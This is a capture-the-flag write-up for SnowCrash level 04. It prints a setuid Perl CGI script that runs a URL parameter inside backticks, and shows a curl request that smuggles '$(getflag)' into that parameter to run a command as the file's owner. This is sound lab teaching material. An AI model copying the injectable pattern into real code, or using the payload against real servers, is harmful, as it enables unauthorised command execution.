# Level 04

## Description

Let's see what we have here :

```
level04@SnowCrash:~$ ls
level04.pl
```

Ok, this looks like a perl file. Let's check out its permissions :

```
level04@SnowCrash:~$ ls -la level04.pl
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

So here too the binary runs with the privileges of the file's current owner = 's' flag (the owner is the user "flag04")

Let's try to verify what does this do :

```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It uses/imports the "CGI qw{param}" module, which is used to handle HTTP request parameters, so here the `param("x")` will retrieve a value passed from a URL or form (like : "www.example.com/?x=hello", or something similar. This function named "x" takes an argument (which is the "$_[0]", by default) and stores it in a variable named "$y" and executes a shell command (echo) using backticks in the printing... interesting. Backticks in Perl execute system commands (just like a shell), so your perl script executes a shell command, so this line :

```perl
print `echo $y 2>&1`;
```

- first, it executes the shell command "echo $y 2>&1" (the "2>&1" means that "Send/redirect errors (std 2) to the same place as normal output (std 1)") = so this shell command does "Print the value of $y, and if there are any errors, print those too."
- then, it prints the result on the terminal

Let's try to run it :

```
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html
```

Ok, so this looks like a cgi script for a web server expected to be run at port 4747. This script prints blindly whatever the user passed in his HTTP request parameters.

Now, this is interesting because this prints whatever the user gave in the HTTP params he sent, but it also accidentally allows running extra commands as user "flag04" (owner) if the HTTP param input is malicious (and this makes this script vulnerable to command injection).

So, let's exploit it by payloading it with a shell command (let's use the "getflag" command, in order to getthe flag to the next level without needing to first log in to the account "flag04" to have the rights to run the "getflag" program) :

```
level04@SnowCrash:~$ curl 'localhost:4747/?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Single quotes prevent all shell $ expansions (for curl it's the same result with or without the quotes anyway). The shell passes the string literally to curl (getflag is never executed by the shell, it's executed only by the perl script).

```
level04@SnowCrash:~$ su level05
Password: ne2searoevaevoem4ov4ar8ap

level05@SnowCrash:~$ 
```
